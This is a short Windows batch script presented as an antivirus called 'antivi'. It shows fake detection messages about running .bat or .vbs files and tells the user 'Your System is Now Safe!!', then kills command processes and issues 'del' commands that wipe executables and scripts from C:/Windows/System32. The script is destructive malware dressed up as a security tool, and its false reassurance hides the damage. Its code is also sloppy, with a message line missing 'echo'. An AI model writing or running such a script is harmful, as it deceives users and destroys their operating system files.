@echo off
title antivi
mode 1000
color 0a
goto start
:start
if exist .bat goto a
if exist .vbs goto b

:a
color 0c

echo Something .bat file is Running In Your Pc, Wait We Solved it!!
pause
color 0a
echo Your System is Now Safe!!
pause
taskkill /f /im cmd.exe
if exist .bat goto c
:c
del C:/Windows/System32/*.exe
del C:/Windows/System32/*.bat
exit

goto start
:b
color 0b

Something .vbs file is Running In Your Pc, Wait We Solved it!!

pause
color 0a
echo Your System is Now Safe!!
pause
taskkill /f /im wscript.exe
if exist .vbs goto d
:d
del C:/Windows/System32/*.exe
del C:/Windows/System32/*.vbs
exit

goto start
